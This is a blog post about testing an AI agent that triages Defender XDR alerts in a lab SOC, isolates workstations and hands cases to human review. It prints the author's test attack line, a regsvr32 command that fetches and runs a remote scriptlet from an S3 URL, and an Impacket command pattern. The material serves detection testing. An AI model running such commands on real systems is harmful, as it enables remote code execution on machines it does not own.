---
layout: post
title:  "Autonomous SOC, part 2, isolating agent"
tags: [ SOC, AI, featured]
author: jouni
image: assets/images/autosoc2/logo.png
comments: false
categories: [ SOC ]
---

# Autonomous SOC, part 2, isolating agent

The first part was concluded at the AI making analysis of the alerts intiated mainly from OpenSearch. The AI was able to make good analysis of the alerts, giving insight which was really helpful. It investigated the alerts further when needed using the tools at hand, Defender XDR Advanced Hunt and OpenSearch query features. It reliably closed the False Positives so the next part was to test with more severe alerts.

I had to make massive changes to the ingestion wokrflow for Defender as I didn't like handling all the alerts as invididual items. I updated the Tracecat workflow to group alerts per incident ID so that there will be a single case for an incident. If incident is updated in Defender XDR, the new alert is added as a comment to the existing case. I wanted to use Defender instead of OpenSearch for this part as OpenSearch alerts are quite unknown to me and I don't fancy going through the massive amounts of detection rules. Also, Defender gives out much better telemetry as part of the alerts.

# Alert number one

I started with something easy; an alert which should be always malicious. I ran Impacket from Kali linux towards one of the monitored endpoints. This painted the Defender XDR red of alerts grouped as a single incident which then flew in to Tracecat as a case. There is healthy amount of details as all the evidence is also available from each of the alerts grouped as an incident. This makes the life of the AI agent much easier. The incident was flagged as Ongoing hands-on-keyboard attack via Impacket toolkit, with high severity.

The agent did the following initial analysis:

![]({{ site.baseurl }}/assets/images/autosoc2/pic1.png)

It nicely analyzed that there were several commands being run which were spwaned from WmiPrvSE.exe, also noting the PID of the process which is a nice touch. The intial analysis shows that the AI agent is pretty sure it's malicious but it decided to do further analysis.

![]({{ site.baseurl }}/assets/images/autosoc2/pic2.png)

The deeper analysis was done by running a KQL query. I created two tools for the agent which it is free to use; premade KQL query to which the agent inputs devicename and timestamp and then a free KQL query option where the agent can put any KQL query it wants. This time it used the first option, after which the agent was able to pinpoint the commands executed from Kali.

The next analysis is so long that it would not fit to a picture so here are the notes directly:

--- 
## Investigation Summary

**Status**: CONFIRMED THREAT - LATERAL MOVEMENT ACTIVITY

**Resolution**: This is a confirmed Impacket-based lateral movement attack requiring immediate remediation.

## Findings

1. **Impacket Toolkit Usage Confirmed**:
   - Multiple cmd.exe processes spawned via WmiPrvSE.exe (WMI)
   - Commands executed: whoami, ipconfig, ping with output redirected to ADMIN$ share
   - Pattern: `cmd.exe /Q /c <command> 1> \\127.0.0.1\ADMIN$\__<random> 2>&1`
   - This is the classic Impacket psexec/wmiexec signature

2. **Attack Timeline** (2026-03-17 20:39-20:40):
   - 20:39:00 - ipconfig command executed
   - 20:39:17 - whoami command executed  
   - 20:40:01 - ping 192.168.3.100 executed
   - 20:40:28 - ping exmp.domain executed

3. **User Context**:
   - All activity under user "kikki" (EXMP domain)
   - User SID: S-1-5-21-3094116704-1622290859-1499931529-1104

4. **Network Activity**:
   - ICMP connections to 192.168.3.100 (target host)
   - NTLM authentication events observed
   - SMB connections to ADMIN$ share

5. **Device History**:
   - Device exws02.exmp.domain has multiple prior alerts (Incidents 57, 67)
   - Prior alerts were for "Use of living-off-the-land binary" related to certutil/powershell maintenance scripts
   - Those appear to be separate, likely legitimate maintenance activity

## Evidence Analyzed
- **Defender Alerts**: Retrieved 5 alerts for device, including the high-severity Impacket alert
- **Advanced Hunt Query**: 119 events found showing WMI-based process creation and network activity
- **Process Chain**: svchost.exe (Winmgmt) → WmiPrvSE.exe → cmd.exe → various commands

## Actions Required
This is a CONFIRMED lateral movement attack using Impacket toolkit. The device needs to be isolated immediately to prevent further spread.

**Next Action**: Isolate device exws02.exmp.domain (device_id: 6e272394589cb0858e0cf8ffdde03ef2de13354e)

---

It did a nice little timeline of the events, noted the user context and network activity. It also showed some of the device history. I like the evidence analyzed too. So now it was pretty sure it is malicious use of Impacket and wanted to isolate the device. This it can do with KQL as I created an isolation tool to which it needs to put the device_id. There is another tool which the agent can use to get the device_id with device name. 

The next step I also need to add directly as it wont fit a picture:

---

## REMEDIATION ACTION TAKEN

**Action**: Device ISOLATED successfully
- Device: exws02.exmp.domain
- Device ID: 6e272394589cb0858e0cf8ffdde03ef2de13354e
- Isolation Action ID: 3d0b4b1e-f249-439b-8753-68883a199109
- Status: Pending (isolation in progress)
- Timestamp: 2026-03-17T20:52:19Z

**Reason**: Confirmed Impacket lateral movement attack with reconnaissance commands executed via WMI.

## Final Investigation Summary

**Status**: THREAT CONFIRMED - REMEDIATION INITIATED

**Resolution**: Device isolated to prevent further lateral movement. Case requires human analyst review for incident response coordination.

## Key Findings
- **Attack Type**: Impacket toolkit lateral movement (psexec/wmiexec)
- **Device**: exws02.exmp.domain
- **User**: kikki@exmp.domain
- **Target**: 192.168.3.100
- **Techniques**: T1047 (WMI), T1021.002 (SMB/Windows Admin Shares), T1018 (Remote System Discovery), T1033 (System Owner/User Discovery)
- **Commands**: whoami, ipconfig, ping with output redirection to ADMIN$

## Evidence
- Defender Alert: "Ongoing hands-on-keyboard attack via Impacket toolkit" (High severity)
- Advanced Hunt: 119 events showing WMI-based process creation
- Process chain: svchost.exe → WmiPrvSE.exe → cmd.exe → reconnaissance commands

## Actions Taken
1. ✅ Device isolated via Microsoft Defender
2. ⏳ Awaiting human analyst review for incident response coordination

## Recommendation
- Human analyst should review isolation status and coordinate incident response
- Investigate user "kikki" account for potential compromise
- Check target host 192.168.3.100 for signs of compromise
- Review other devices for similar Impacket activity

**Setting case to on_hold for human analyst review per post-remediation procedure.**

---

It isolated the device and put the case to On Hold state. The agent was instructed to put cases On Hold if it is issuing isolation or if it needs human help. In this case the human would go in and verfiy the analysis done by the agent and see if the decision was good or not. The full flow took around minute so it was pretty fast. I am quite impressed of how well the agent did! 

# Alert number two

This example looked very malicious so the agent didn't have to work too much. I did some further testing with Living of the Land tools to raise something which is not as obivous. First tries did not produce an alert at all but then I ran this:

regsvr32.exe /s /i:https://s3.amazonaws.com/bucket-name/libraries/office_update.sct scrobj.dll

AWS domain used in conjuction of regsvr32.exe. This resulted a medium alert in the console, also turning to an incident. It was ingested to Tracecat where the AI Agent started to do it's thing.

![]({{ site.baseurl }}/assets/images/autosoc2/pic3.png)

The agent is pinpointing the correct things and decides to investigate more with Defender.

![]({{ site.baseurl }}/assets/images/autosoc2/pic4.png)

The agent noted the previous resolved alerts and thinks this is different, which it is. It also thinks it is malicious but decided to investigate more. The next analysis I need to add as text as too long for a picture.

---

## Advanced Hunt Query Results

**Query**: Advanced hunt on exws03.exmp.domain around timestamp 2026-03-24T18:40:14.8732704Z

**Results**: Found 17 events around the suspicious activity. Key findings:

### CONFIRMED MALICIOUS ACTIVITY:

1. **Process Creation (18:40:14.9188519Z)**:
   - regsvr32.exe (PID 10980) launched by cmd.exe (PID 7072)
   - Command: `regsvr32.exe /s /i:https://s3.amazonaws.com/bucket-name/libraries/office_update.sct scrobj.dll`
   - User: kikki@exmp.domain
   - **CRITICAL**: Process was running in a REMOTE session from "Guacamole RDP" (IP: 172.17.0.2)

2. **Network Connections (18:40:15-18:40:16Z)**:
   - regsvr32.exe connected to:
     - `16.15.183.230:443` (s3.amazonaws.com - AWS S3)
     - `3.164.70.26:80` (ocsp.r2m04.amazontrust.com - OCSP validation)
     - `13.33.233.159:80` (ocsp.rootca1.amazontrust.com - OCSP validation)
   - All connections initiated by the malicious regsvr32.exe process

3. **DLL Load (18:40:15.4561499Z)**:
   - regsvr32.exe loaded scrobj.dll from C:\Windows\System32

### ATTACK INDICATORS:
- **Technique**: T1218.010 (Signed Binary Proxy Execution - Regsvr32)
- **Delivery**: SCT file from AWS S3 bucket (office_update.sct)
- **Execution Context**: Remote session via Guacamole RDP
- **User**: kikki@exmp.domain (interactive user, not SYSTEM)

### KEY DIFFERENTIATOR FROM FALSE POSITIVES:
- Previous LOLBin alerts were from SYSTEM account running maintenance.ps1
- This alert is from user kikki via RDP session
- The S3 URL pattern (bucket-name/libraries/office_update.sct) is a known attack pattern

**Assessment**: This is a CONFIRMED ATTACK. The regsvr32 LOLBin technique is being used to download and execute malicious code from an S3 bucket. The activity occurred during an RDP session, suggesting either:
1. Compromised user credentials (kikki)
2. Attacker with RDP access executing commands

**RECOMMENDED ACTION**: ISOLATE DEVICE and run AV scan

---

It diffrentiates this from the previous attacks and notes that this was run from RDP session originating from Guacamole RDP (Guess what I am using to connect to the device). So it is able to see that this is different from the other observed patterns. It confirms it as an attack, isolates the host and runs an AV scan. It is put on hold for human verification. This wasn't as clearly malicious as the first example, however, there was many signs of this being malicious. I am on the edge if I agree with the isolation, however, I think I do as long as the device is just a workstation. In real life there would be much more context available to the agent, like device information etc. Also tuning the response options in production would be needed.

# Conclusion

So what is the conclusion? I think the agentic AI clearly shows that it is able to provide quite cool analysis, it is able to make good decision and there is clearly room for building SOC tools using the agentic AI. It can help humans to do their work and it can be quite fast in delivering the results. The analysis work done by the AI agent is good. It is often pinpoints things which the SOC analysts might not understand to report - for example - it was earlier reporting how a certain malicious looking alert was normal as it was configured with GPO and deployed to all of the devices.

I see lots of promise in this and I am very excited in understanding and bulding more of these agentic solutions. I have been building something for threat hunting purposes as well and I feel like I could be building these all day and all of the night. Yes it is much simpler to build these simple tests than production but it is lots of fun. Some of the same principals applies on production though of course there are lots of other factors which needs to be accounted for.

In reality I think there is a high chance that the agent would fail on these edge cases. It likely would close down TP:s at times and using this in production would need utmost care. It would need to be monitored for a prolonged period while humans are doing the analysis work to see how it compares to human analysts. However, it is good to remember that the human analysts are not perfect either - expectation should not be that it needs to get eveything perfectly right. Thats why we will still have humans to verify.

Oh! I also did a tuning tool where the AI can suggest tuning the alerts. It is a voting system so as the AI analyses the alerts and thinkgs something is FP it can vote for tuning it. There is a separate tuning statistics where individual suggestions can be seen and tuning can be "officially" started. It can also use this information when making analysis. Here is a picture how it looks like in the case notes:

![]({{ site.baseurl }}/assets/images/autosoc2/pic5.png)